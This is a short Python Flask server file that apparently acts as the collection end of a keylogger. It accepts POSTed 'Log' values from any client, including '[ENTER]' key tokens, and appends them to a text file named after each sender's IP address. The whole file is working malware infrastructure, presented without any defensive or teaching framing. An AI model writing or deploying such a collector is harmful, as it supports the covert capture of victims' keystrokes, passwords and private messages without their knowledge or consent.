from flask import Flask, request
app = Flask(__name__)

@app.route('/', methods=['POST'])
def post_request():
    ip = request.remote_addr
    data = request.get_json()
    c = data['Log']
    save(str(ip),str(c))
    return str(request.get_json())

def save(ip,c):
    print(ip+" "+c)
    pfile = open("Database/"+ip+'.txt',"a+")
    if (c == '[ENTER]'):
        pfile.write(c+'\n')
    else:
        pfile.write(c)
    pfile.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
